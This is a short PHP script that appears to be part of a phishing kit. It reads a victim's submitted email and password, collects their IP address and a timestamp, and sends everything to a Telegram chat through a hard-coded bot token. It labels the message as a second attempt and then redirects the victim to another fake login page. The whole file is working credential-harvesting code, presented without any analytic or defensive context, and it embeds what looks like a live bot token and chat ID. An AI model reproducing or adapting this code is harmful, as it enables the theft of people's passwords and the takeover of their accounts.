

<?php
// name 
// pw
// subbtn
date_default_timezone_set('Asia/Manila');



if(isset($_POST['foo'])){
    $name  = $_POST['eml'];
    $pw    = $_POST['pwd'];
    $datez = date("Y/m/d");
    $timez =  date("h:i A");
    $day_of_the_week = date("l");
    $backticks = "**";
    $ipAdd = $_SERVER['HTTP_CLIENT_IP'];
    $ip = $_SERVER['HTTP_CLIENT_IP'] 
   ? $_SERVER['HTTP_CLIENT_IP'] 
   : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);

         $token = "6374148669:AAEEFpjq2kVlp-DWg_OwnS6xQ56zffuYbwk";
    $data = [
        // 'chat_id' => '1002067181259',
        // 'chat_id' => '-@ashleyughchannel',
        'chat_id' => '-1002067181259',
        'text' => 
">$-$-$-$-$ 𝑱𝑬𝑺𝑼𝑺 𝑪𝑯𝑹𝑰𝑺𝑻 $-$-$-$-$->
| username : <code>$name</code>
| password : <code>$pw</code>
| 𝟐𝐍𝐃 𝐀𝐓𝐓𝐄𝐌𝐏𝐓
| $ip

| $day_of_the_week  |  $timez | $datez",
        'parse_mode' => 'html',
        
    ];//endof array

    $sendMSGGG = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($data));



   


};
header("location:login3.html");


?>